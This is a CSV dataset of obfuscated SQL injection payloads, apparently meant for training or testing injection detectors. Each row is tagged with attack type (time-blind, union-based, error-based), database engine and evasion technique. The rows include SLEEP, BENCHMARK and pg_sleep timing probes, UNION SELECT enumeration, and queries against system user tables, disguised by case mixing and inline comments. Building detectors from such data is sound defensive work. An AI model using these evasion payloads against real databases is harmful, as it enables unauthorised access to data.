payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"0O1"" ) AnD | 0X0x3o4e2a~ LIKe DbMS_UtILITy.sQliD_tO_SqLhaSH ( & ( cHR ](, (sELeCt 0X76) !) Or Chr ($ (seLeCt (SELecT (SELeCT (seLECt 0xaD)))) ) Or chr ( (SELeCt (SEleCt (SelecT (sELEct (seLEct 0B1110000))))) ) or chR ( (seLEcT (sElEcT (SElecT 0X0B0b1181110a))) )+ oR cHr ( 3X70 ) :OR ( selECt ( CASE WhEN ( (Select (SeLECT 0X1292)) LiKE (SELeCT (sELEcT (SElEct (sELecT (select (sELEcT 0x31C)))))) ) oR FaLse and TRue AnD TRue Or 'Y' noT lIKe:'y' or (selEcT (SELecT 0X0)) Or FALSE oR False!OR 0x17ba=(SELECT (SELECT 0x17bb)) OR False# theN (SeLeCT 1B3) ELSe 0b0b0x0 End, )/**W""*/ FROm dUAL ) oR chR ( 0X07 ) OR^CHr~ ( ~0X0B911a ) oR chR ( ,0X0x7 ) OR cHR^ ( ~0X7a ) Or chr |( ""113 ) ) [ ) :aND ( ""VUrb"" Like ""vUrB^B1J.K XPIHR",error_based,oracle,case_variation|inline_comment|function_alternative|hex_string|scientific_notation,0.51,rule,sqliv5_json,unknown
"0O0b0x1%'* <) )< ) aNd ExP (~ ~ (;-SelECt * FRoM /*(SELECT (SELECT (SELECT (SELECT (SELECT 3)))))#<R*/(% seLEct concat \(& 0x0x3578fEA71, %( !seLECT ( _elt ( 2o0X1Ffe=0x6FFE,(SElecT (SeLEcT 1x1)) ) ; ): ( ) ,0X754a0o1377a73,0b0x0x2O110 )} ) ;X ) ) ANd (/*hkU$oK ()yXw*/ (^ ( '%'='f:",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0X1'+ (;.sEleCT 'PleS' whERE 0x1094 lIkE 0X0X1094 PRocedURE ANalYSE ( -ExtrACtvALUE_$(_ 0x0B11120111010,COncat *({.4x5C,3o0x0o0o177525610a81, (/*0X4&E(!s`MT'WrpeAQ@womjo;(sElecT'(SELecT (SeLeCT 6)))sH*/ SELEcT '(} CAse when ( (SeLect/* I`*&K $; cHYax?*/0X0O25d0) like< ""0B7019031580206 ) Or ""H"" NoT Like ""h"" ANd TRuE AnD truE Or False OR?(selECt (sElECT 0X8)) and!(SElECt 0x1) oR 0x0O0X0 Or FALSe ' and TRue ANd (sELEcT@(seLECT 0x1be7)) Not LiKe (SElECt 2X1BE8) oR ""`K6"" LiKe ""`K6*"" && true AnD tRUe)AND 0b10011011111110 noT liKe (SeLeCT (SeLeCt 0X0X1AFf)) Or False|And TRue Or FAlsE Or FalSe or 'q;'<>'q;' OR False OR False#then 0O0b1x0x0B1)eLsE:(sELEcT (sElEct (SEleCT 0X0))) enD ) ,*) },0O0X9X017A867a71 ) [=)'~ ,0X8 ) ?) +'WQ <?|M{L0B1020%B],JOXkL*",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_single_quote
"0x9%"" ? && ; (SElECT]9o0o0O0O5O21501);&LIKE/*L?_b>*/ _( sELeCT(CounT` ( ;* )'}>fRom DoMaiN.DoMaIns(As't0b0b0X0b0B0B102,dOMAIn.colUMnS/aS t4x0B0O6o0o5,dOmAiN.TaBLEs as+T7 `) +&&]""%""=""",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0O0B3o0b5001$and 0O6X0b10111110e/*(seLEct (SelEct (SELecT (sELect 0x5))))*/= \ (,]seLEct CouNT ;($ * ) ; froM rDb$fiEldS AS t5,rdB$tYPes aS$t0b15,rDB$collationS aS[t3B4b0b8B1000010001110100000131001101011,RdB$fUNCtioNs AS t4 ^):/*AEC&ICNZ zk-:`j:*/AnD=trUe Or FAlSE && tRue anD tRUe AND&""2`""<>""2`r"" AND ""K]""<>""K]:""/ && 0XBCD <> 0xbCE oR 0B0o0B0 And TruE and truE<--?yeKf",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,string_double_quote
IF])(= 0o0B101000000106110=(SEleCt$7534) )& seleCt.(sElEcT 8574) Else/*iXg[*/drOP&FuncTion}NXBe--,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0b1'! )& AnD;0O26745{ OR=""8|g"" oR falsE oR (seLEcT 0x0)/ANd-(SelEct (SelECt (selEct (SELECT 1)))) OR ""`0O0b0""<>""`0""/**/oR ""hi""=""hIV""_or falSE aNd tRUE#nOt=""2|g""#= |6X91b5?+f VLw",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,string_double_quote
5' oR ^(. SeLect 'sCCt' wheRe (seLecT (SeLECT?(sELeCt (SELECT 0566))))=7x9FD AND ( seLECT * fRoM ( selecT (/*[*/ slEeP! ( 0X0o10` +) ` ) ? ) fznO ) /**/ ) OR ',unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"1'/*hSb*/WheRe]0B110100100010"" =!/3362",unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"1' ) )= and 0xef0O0X0=beNcHMArk (( (seLEct (sELecT (SELECt 0x7c0O0X4B43))),mD7b107_ (? 0x0B0b101001011001101000001010100101101010111101100010100000111000101110001110010110111011010 ~ )% ) And</**E8.-Ypf*/\ ( [ ( 'InRM' lIKe.'InRM",time_blind,mysql,case_variation|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
1x8 ) or (/**/ seLECT *#fRom; ( seLeCT ( *sleep ( (select (sElECT (SELECT (SeLeCt 3)))) ) )% % ) YdpU )*,unknown,mysql,case_variation|comment_whitespace|inline_comment,0.05,rule,sqliv5_json,unknown
"5X1%' *) ) Or (SEleCT (SeleCt (SeleCT 6156))) LIke ( sELECT;COUnt ( * ) FROm geNERaTE_SerIeS ( /*|(_4'wu|K}DDeqM$Z*/(SELECt (sElECT 0X1)),0o0O0x15FA580 ) ) *--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
SELect<sLeEp\}((?2X0b100B101x5 $\)*$} )/**/ +',unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"?( SELEct [$(/*?GG~E,Gf1W/&:j{L*/?CAsE when ( ]5xf0o107 LIKE! 0xABb ) .^THen 9O1.elsE;0x0b1/ (; SeLECt (sELEcT:0b15O0x0X0)@ )` END, ) )",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0O0X0b1o0X0x0O2%' ])/*!/N (SelEcT 0B110)4G)|1;*/ UNION)aLl sElEcT!nULL,NULl,nuLL,Null,nuLl aNd/*G Not like )\S+.gfo!W*/true_ && !(SelecT{(SElEcT=(sEleCt]0X4eca))) lIkE'(selEcT 1x0b0o1a92)>AND ""Sk""=""Sk"" OR ; 0x23De=(sElEcT (selECT 9283)) +?OR.. (SELECT.(SELecT 0X1143))=(SeLect 0B0X1145)&&TRuE OR ""k""[LIKE ""kO"" ANd True#io0O4gA&'FR?CP9q{S;A",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_double_quote
"0O1"" Or~(seleCt'(seLECT 0x6XEa4b8)) `LiKE ( SELeCt CounT }(: * !) /*YNKeee?[!Ai@EOt3;""`5P0kN|~(SeleCt (SeLeCt-(SELECT (SELECT 3))))} Gi*/ FRom alL_useRs t4o80,all_uSERS_t7X2,ALL_USErS t8x3,alL_userS T9,AlL_USers~t0{ ) && < ""jtgS""}LIKe ""jtGs",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
1B0b3o1' ) 'aNd0x6X1O2b0x8b0X0O0B111B4 ?LIkE !/*A0B0o156 a; 0X1f~ { u*/ ( ?SELEcT?(selEct (selecT 1x0X0x0O7B1b47)) FRom]Pg_sLEEp ;( 0X5; )`/*0x0X12?avjCiJq>AT J*/ )/ aND}/*=GVhHr?y E0o3*/ ( 'nqOL'`[LiKe 'NqOl,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"0o0%';/* (sELEcT (SeLEcT (seLect}(selEcT (SELeCt (SELect (sEleCt (seLeCT 0X3))))))))Bv4vGS)u&uJiYE|?w j*/ ) +) ) AnD ` ( seLECt`2b0O0B110010010113000191010011111101000100110011011211 frOm ( SeLect COUNT ( * )@P2p* ,ConcaT \( 0X0b11011010110111910001110A0o107, (~ SeLECT ( eLt ( $(SElEcT (selEcT (select (SeleCT (sELECT 0xc5a))))) liKE 0O0b0x5bde392Ce1B1,0X0O1 ) `%) )@ ,0O0X0x2CdA0x0O9ffa71,fLo|| ( rAnd ( (SeLEct (SELECt 8x0)) ) *0X2>` )! )` X FRoM inF or:mATiON_sCHeMA.ChAracTer_SETS gROuP BY x ) a )~ And ( `\( < ` ( '%' lIKe '",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"1' OR (_ SElECT+'ZVPl' whErE (sELeCT/0x0X0B1010f0b0b1001011001){LIke:And@'"" '='"" ' ANd/**/TRUe#0b0X0o556""uNIoN aLl@SeLeCt nUll,nUlL.Or.0B0o0O0B1110010101001;)LIKe]>0B0O5B1210010501110}or|FaLSE#/Q::ho`,`x<D _",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,string_single_quote
"1"" ) ) /**/ ) OR (SelecT 8384)=liKE ( 'ABcDefg',UPPEr ( hEx_ ( RaNdOMBlOB ( 0b0b1000111101111010100000111101110000010010000100100011001000010110010110000110111010010100000000/2 ) ) ) ) anD ( ( ( ""nEVR""/**/lIKe ""neVR",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative,0.53,rule,sqliv5_json,unknown
"0{wHerE_0b0o0b11114021120x4d8X1C{@ LikE\& 0x0o18X0X0O2x0X1D1c""Or 4504'= [( sELeCT&6X0o1x53e fRom aND('8Mq' not LIkE '8MQv'/ and true] && ""5072 NOt LikE 0o0x1o0b1101d0b0b0 And (sELeCT (select 5X158B)) NOt }=LIke '(seLect^0O0X0B0x458c) ANd<(seLecT 0X1) aNd (SeLEct (sEleCt (sELEct (SElect (SELECT 4155))))) Not liKE (selECt (SeLEct 4156)) OR{ FAlse#pG_SleeP?/* ?( ?)wt}v;*(SElECT (selECt!(SELeCt (SELECT (SELECT 3))))) $*/(` 0X0X0X5 )^) )}<' and~ 0X1 Or 3b111B6\--p~}tIsTiqt<:y",unknown,unknown,case_variation|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"8%' ) ) && ChaR ( (seLEcT (SeLECT (seLecT/*1A7;K*/(seLeCt (SelECT 8X325))))); ) Or cHAR ( ;0O0X79{ ) oR char ( ""0X61/*pEFPl;Mhl^*/ ) or cHAR ( 0x50[ ) =ReGExp_SuBstRiNG +()>rEPEat ( LefT (< cRYpT_kEy !( char/ (_""0B101o101 ) oR ChAr (| (selEcT 0x48) ) } or cHaR ( 0x53 ) ,nulL /*(seLeCT 0X9)&GhG ];*/) +,(sELect (sELect (select 2X0b0))) <)< ,0o3563224412 ) ,NUlL* ) OR;""0g"" nOt; LIKE ""0B0G"" OR falsE and ""."" nOT LiKe "".:"" OR False OR False --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
0X0O0o0B2B100b0O0b111' *`)^ < ) ; )< )+ or:*)sLeeP _(~ 0b0O0O3b110b0b0B0b1111301000x497 *)/*<*B([J? ldd*/} &&; ( `(<`$. (=<'ecur'='ECUR,unknown,unknown,inline_comment,0.0,rule,sqliv5_json,unknown
"0o0O0O7b8o8b0b0B139X0b0o0B0x9X5%"" +} && >0b0X6362 <>>9x6363*Or]FAlsE +OR \0O10XaAF!like 0b0O0o0b11101101110100& aND` ""FL""<>""fll""/**/ OR (SEleCT-0X0B0B0B0X121B)<>0B1O11013 Or faLse OR FaLsE#) ' `)<_-[`)]> UNiON$alL&SeleCt?nULL,nULL,Null,Null,NUlL,Null,nulL,nuLl.;aNd )True#IXz)3o0B0X2MGKpK,",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"0o0O0b0O1"" )? ) && elT OR 0b1010111011100<>5596#( [0x526 LIkE\~ 4B0b1001010100000111110100000010001100010,SLeep _(/**/ 0O2O0o0b101;% ) { +)=&&& ,(/*iFuCWp0x0bggcx */ *( ""afbY"", like ""AfbY",unknown,unknown,comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"9' ). ):_ > ) AND UPdaTEXml (\ (sELEcT (sElect (SELeCt (seLEct (SELECT 393))))),CONcat (/ 0o0o0x0b10E,0b5x7171706a71, (/**&*x*/ sELECt <(/ eLt ( (selECt@(SeleCt (SeLEcT 0xd41))) =`(sELeCt (sELEct (sElECT 0xcF9))),8b0X3X4 ){ ) ) ,0O0x0o1615A0X2fFA0O7x57 )% ,0B8x489 ) AnD ( ( *; ( 'yQHk'| LIke anD true && 4X1 oR 0o3 && truE && (SeLEct[(selECT (SEleCt (sELEct (SELECT 1))))) && ""N""=""N"" oR 7x0 Or FaLse aNd 'f>' not Like 'f>V' AND trUE OR 0x0xDC4 not lIKE (selECT (SELEcT (seLeCT 0XDc5))) oR FalSe OR False AND True# 'yQhKXEi,r;V.,XKB18`?",error_based,mysql,case_variation|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,string_single_quote
"0O0X7o1""!!);!_ ?}anD ;""&5x7e99,lIKE (SELECt:0X1ED5b0X3e8) OR faLse Or (seLecT 0x0)#anD ]$(\ ""YQzq"" +=/*fve^*/ ""YQzQfj",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
0O0o0b0O1/*IQq*/ ')~_&$)/**/ ~ as:vRYV WhERE](SelEcT[4B8o13710)[lIkE}0b0X18e0,unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"0x0X0o0B1""! ) ] ) or ChAR ( 0O165 ) oR CHAR ( 0x6F /*(seLEct 0X8)yR`_*/) ||cHAr ( (SeLeCt (SELECt (sElEcT (sELECT (SElECt (sELEct (SelECt (SeLect (SELECT 105))))))))) ) OR CHaR ( (seleCT (SeLeCT 0x63)) ) =REGEXP_SuBSTRing (/**/ repEAT (['LEFt (/ cRYPT_kEy ( cHaR ( 0x3x3c ) ||cHAr ( 0X0o15 ) or CHaR ( 0x53 ) ,NuLL ) ^,(SeleCt (SELecT (sELecT (sELEcT 0X0)))) ) ,0o3542262562 ) +,nuLl ) AnD ( ( <""DQIs"" LiKe ""dQiS",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"6 ) Or 0O0x2212=BEnchMarK ( !(Select (sEleCT 0O93045504)),mD5 ( 0X0X2b0x1o7A7x0O2411 ) ) aNd ( (seleCt?(seleCT (sELeCt (SeleCt (SeLEct (SElect (SELECT 1743)))))))| = /**/ 1570",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"0o0O1 + )` ) ANd cHar ;( (SELeCT (SElecT 0o153)) ) `Or chAr (_ 0o0XAe <) OR ChaR ""( (selECT (selECT 0x0B0x3D)) )+ Or cHAr ( \(SeLEct 0X8b1011101)=.) =rEGEXP_sUbStRiNg ^( repeaT:+({ LEft <( CRypT_key )( <cHar[ (} 0x41 ) OR>ChAR ( 0x45 &) or cHAr `( 1010011 ) ,Null )/**/ ,(seLEct 0x0) ,) &,(seLEct (sElEcT 2X2e395D0b1011)) ) ,nUll /*U$*'Txf+pG?VTqtNYXP0x2XDG*/) or faLSe~ANd TRuE oR (Select 0) AND 0X1202=(SeLecT (SELECT 4910)) || (SeLeCT (SELEcT (sEleCt (SEleCt (SELECT 0))))) Or '%gq' NOt Like '%gQ' oR (seLecT 0) --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,like_clause
"2x9X1B198""_}() <$=AND )(select}(sElEcT (SELECT 0b0o5))) OR False AND True#)/*IuhDJE*/ ; uNiON\aLL`seLect!nUll,null,NULl,nUll,NuLL,nUll^+or` False aNd'""R;"" LIKe {""R;""$ANd TRUE or]fALsE#0o0O0B0x64Etm4qpnqoM",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
0X8)wherE (selECT (seLeCt/**/(SElEcT (SELECT 3502))))~ Like/ 0xDAe oR dER BY}0x2b1--,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"6X1'+ ( SelEcT 'ejoX'/*-*/wHErE/*[/-:p*/(seLecT (SElECt/**/(SElect 0O0b1010001110101))) liKe 0B0b1011110000100101010100111001111100111!uniON-alL-sELeCt nulL,NulL,NUlL/**/Or 0X1708<>0X1708#Dc",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"0b189%' ) AND ([:SELeCT * From ( SELect (& Sleep ( :0o0o8x0o5 ) )/*`HtlcaGgO*/ ), gCrr, ) !Or$'('='(.'-&& (SELECT 0x3o3) OR""False &&`True AND ""F"" NOT LIKE ""F_"" OR False OR False AND True AND ""k""<>""k4"" OR (SELECT (SELECT 0))#Hguy)",unknown,mysql,case_variation|comment_whitespace|inline_comment|function_alternative,0.05,rule,sqliv5_json,string_double_quote
"6b0o1';WHErE (sElEct (SELECT (SELECT 0x12dc))) *= |(seLect (SELECT 0x9e9e)) Or (SElECt 0O10526)= :(.[SeLect 0b0x0o0O10222 FROM PG_SlEep `( 0x0x5 ) ; ]) ||} 0x0/*Ex""*/--",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"8o0X0B1"" wherE-(SeLect+5x1838)== 9X0B0X12E ANd eLT ( 0x0b100ba! lIke/aNd 0X1 or (SELect (SelecT (SeLECT 0)))`And 0x33C In ((sElEct 827),(SElEct (selECT (SELeCt (SELeCt (SelecT 828))))),(sELEct 829)) or fALse or faLse && True# (seLEct (selEct (seLeCt 3x145a))),sLEeP ([ 0b0o0O5 [/**/)/*y*/ ) :ANd ""cg""=like*""cg"" --c{?Rf F",unknown,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.05,rule,sqliv5_json,string_double_quote
"3%"")and 4o10763 /f;*@uAn:^:3~5 gS0x1\;&~(SELECT 5)*/=.&0b10000110010011 OR{9xCB noT LIKE (sEleCt?213)@oR/*&'|nR*/(sELeCT+(SelEct 0b0)) Or/*pA*/"",""!="","" AND True#y;l1p",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,string_double_quote
1%' ) +@) OR (SelEct (seleCt 0o0x1850)) < LIkE ` ( selecT 0x1072|fROM Pg_slEeP (/*d/?<*/^0o0o5/*`(SELECt 0X5)|. i6^E\|AsmigET8d~Z*/ ) ) Or 'R\k0O0b9X0E' Not =+'r\k5'and2679 nOT LiKe (SELECt 1b0x23F7).Or 4X0 or ;FalSE OR falSe aNd*tRuE(aND (SeLeCt (SeLeCt (SelECt (sEleCT 0)))) aND tRue anD trUE --,unknown,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.06,rule,sqliv5_json,unknown
"0O1"" ( SeLecT ( case wHEN ( 0B0b0b1101000011001001011011000111101011011001101101001000100101010001000000011110010101001000100111101010011011101000011101001001000011 liKE (selEct (SEleCt/*i(e*/0o0X154b)) ) THen RegexP_sUbstRiNg ( ?rEpEaT ( RiGhT ( ChaR (' 0X1483} ) ,0o0b0b0B0B0b0 ]); ,0B0X23De9f7b8C00cC1c7fBBA500 ) ,nuLL ) ElsE Char (\ 108 ): OR Char ( 0x4C+ )` OR cHaR ( 112 ) Or ChAr ("" 0o164 )~ end ) FRom|iNFOrMATiOn_scheMA.System_uSERS ) anD?""kszu"" liKE ""kSzU",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"8b11x1"" WhErE 8x23dD LIKE\@1o0b11012110101801;And (SELEct-0B0x91aA90CfF72) lIkE ? ( SElect cOUnt ( I=Wuo*/**/ )} [fROM~AlL_USErs>t0B1,aLl_UserS t0O0B0x0B10,All_Users T0O3,ALl_UseRs]T0b0X4,All_uSErS+t0o4+ )[|or/*E7|&BCu&e x2*/0b0X0O0-or;0B0b0b0o0B1111100003B110x0b10711d8 like (sELecT 0b0b10010001102010010000101010110100101011011010) OR-""e^Q""=""e^q/"";oR 'VY'+LIKE{'VyJ' OR/(SeLECT%(SELECt`(seleCT 0x825)))=0xa0X0B110010and""D""]LiKE+""d""-and}""Jd""<>""JDq""_oR]fAlSe aND;(SeLeCT (SeleCT (SELEcT_(SELeCT (SELeCT (SElEct (seLeCt (seLECt 0x90b))))))))=5X97b@Or "" 5aE""!="" 5aE""(or FALse and'(seLEct'0X1) <Or .(SeLEcT (sElECt (SELEcT\(SeLeCT 0x60f9))))<>0X10F9 or fALSe ANd ""yq""<>""YqY"" OR (SeLect (SeLeCT (SELECT 0))) OR 0 --",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,string_single_quote
"1'+ ( SeLECT NziJ\where (SelECT 0X1550) LIkE 0O0O0x1590 anD row! ( (SElEct'(SelECt[(SeleCt (sELEcT^(seLeCt 0x135D))))),0x1d2D :) >}%(%=sELect cOUNT ( -* ) _,coNCaT) ( 0X0x6o0O176717730A0B1010061, ( SelEct { ( ELT! ( }0o94182=0X0B11111001D,(SelECt (SeLeCT/0x0x0o1))'/*) ~Lve<=A<zxYB ""E8P*/ ) ~) )^ ,0B0X0o1365a787a51,flOOr* ( ;R aNd ( 0O0x0 ) *(SElECt (SElEcT (sElECT (SeLeCT (SELECT 2))))) ) /*E67_^VA(Gunr:*/ ) :x frOM (* sElEcT (seLeCT (SELECT (sELeCT (SElect 0X14Ac)))) uNioN seLecT 0xEAB UNIOn""seLeCT 0O0Xf3e UNioN SelEcT 0O0x0o0b1101111115110 )% A gROUP By*X }) ) +'",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"5'_ $)~ * ) aNd 0O3B0XEF0 /*j>>&y7)*(select (seLeCT 0X2))(;|*/= BeNchMarK &( |(seLecT 0O0b0B1111101000X0O4C4B0o5O192),MD0o8B101 (.;0x0o0B11000111110001111100101111000, _) + )( ANd $ ( (; 'ObeH'='OBeh",unknown,unknown,case_variation|inline_comment,0.0,rule,sqliv5_json,unknown
"0o0B1%' ) ) ) < And (SELEct 0x1118)? likE UTL_iNAdDR.GEt_HosT_ADDrESs ( CHR <( (SElEcT (SeleCt (SELecT (select (SELECT (SElECT (SeLEct 113))))))) ) Or ChR ( (sELEcT 0xfd) ) && (Select 1) oR (SeLeCt (SELECT 9363))!=(selECt (SElEct 0x0o4671)) or,fALse AnD 0b1 And (sElEct 0X1) oR fALse aND TRuE && True#Or&CHR ( (SElECT (SEleCT (sELecT (SELECt (select((SEleCT (SeleCt/*;XpjZ*/862))))))) ) OR cHR |( 0X0o0x0x0B0O156A ) or cHr (> (sEleCT (SelecT 0B0x71)) ) oR ( SeLEct ( casE wheN !( 0x5132=(sELeCT 6X1135) () then,(SeLect (SelEcT 0x1))&eLSe (Select (selEct 7b0x0o0)) End( ) $ fROM""duAl )^ OR CHr ( 2o0o0xE0B111 ) ||cHr` ( 0XC0 `) /*:f(dX71Tb,|Ib<XR >lI=|iM},iAKH*/ Or cHr ( 0X77 ) or Chr ( (seLecT 0X0o0x7a) )) ||Chr !( (seLect (SeleCT 0X00)) ) ) * ANd \ ( ( >'%' =)'`<ewLP*YDYZgIx0x0O2j9C",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.51,rule,sqliv5_json,unknown
"0o5 ) /*(SelecT|(SElECT (SeLECt+(SElECt (seLEcT (SELECT (SELECT 1)))))))](*/ ) ~ <as Jyfo WheRE (SeLeCT!0x1fb0x8)=8x8fB9 && ^ 0O0O0X1o9x0b1100001a `LIkE ( ?SelecT CouNT ;( <*` )? FROm RDB$fIeldS AS T1,rdb$tyPeS aS{T2,Rdb$ColLATIoNs as T3,RDB$fuNCTIOnS As&T0O4 ) Or?0O0 oR fAlSE Or faLSe {anD trUe AND TRue && trUe --",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0O2"" ) ) ;}As$GVpm WheRe 5x0O2700 ""LiKe (seLecT (Select (seLEct?(seleCt (sELECT (SElEcT 0X19C2)))))) oR+0O0x12EC LikE; (] sEleCT COunT ( * ;) From SYSUSERs AS SYs1,sYsusERS aS;SyS0b101,sYsUsERs`As Sys0o1,sYsUSErs aS SYS0O0X4,sysusers as/*?G (4H}he*/syS8,sySUSeRs as sYS6,sYsUsERs[as\sys7-|| '}'='}/' oR FALSe OR False && (SELECT^(SELECT (SELECT (SELECT 1)))) ^ && True AND ""7"" NOT LIKE ""7i""# ) || FalsE oR (seLECT (SeLeCt (selEct 0X0))) --cuoOW`e",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"7X9'+ +( seLECt HSeF wHErE (SELeCt 0X0X1027) %= (seLECt (SEleCT 0x105a));Or/**/(SELeCt 8421) =] ( SeLEcT COuNT :( * ) fRoM gEnerate_SEriEs ((*0x0B0o0b0x4,(sELEct (seLECt 5200460)) ) )! ) +'",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"0X0O0X3'+*}( [SElect:'mDiU';WHere/*MweK*/0o0x0B1117811b+-like\,0b141011",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0B0O1'+ (/**/ SeLect 'wvQj' WHEre-(SElect (sELECT (sELEct+(sELect (SelecT (SELECT 6701)))))) =""9749",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
1'+ ( <SElecT 'XPbY' wHeRe'0o0XAa4 [=/*oiX*/ 9B101010100150,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
0B1' ) ` ) && (sELeCT 0XB25); LiKE cAsT ( ( chR ( (SeLecT (SElect (sEleCT (sElEcT (SElECT (sElEcT (SeLect (seLECt](SeLECT (SelECT (SEleCt (seLECt (SELECT 113))))))))))))) ) ( || chr {( 0B1110101) ) ||cHR ( 2X70& ) Or chR $( 0X6A ) ||chR ( (SelEct (SELECt 0x0xd8)) ) ) Or (}'SELEcT ( CAsE WHEN ( 0B0X2959E45fD=(selEct 0x295) ')-]/*iZ)U.*/THen 0x0O1 ElSE (sElect (SelECt 0X0)) eND ) ) ::tEXt OR ( CHr .( 7X67 ]) \ or chR ( 0B2X3A ) ?oR ChR ( (selECT (sElECt 3o476)) ) ) OR Chr ( (SElecT 0O138) ) Or CHR ($ (seLEcT (SELeCt 4X391)) ) ) +AS nUmEric ^) && ([^ ( 'YHku' lIke 'YHKu,unknown,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.06,rule,sqliv5_json,unknown
